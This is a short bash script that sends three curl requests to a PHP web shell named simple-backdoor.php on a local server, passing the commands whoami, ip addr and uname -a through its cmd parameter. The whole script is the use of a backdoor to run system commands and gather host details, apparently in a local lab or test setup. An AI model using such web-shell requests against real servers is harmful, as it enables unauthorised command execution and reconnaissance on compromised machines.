#!/bin/bash

curl 127.0.0.1:8090/simple-backdoor.php?cmd=whoami
curl 127.0.0.1:8090/simple-backdoor.php?cmd=ip+addr
curl 127.0.0.1:8090/simple-backdoor.php?cmd=uname+-a
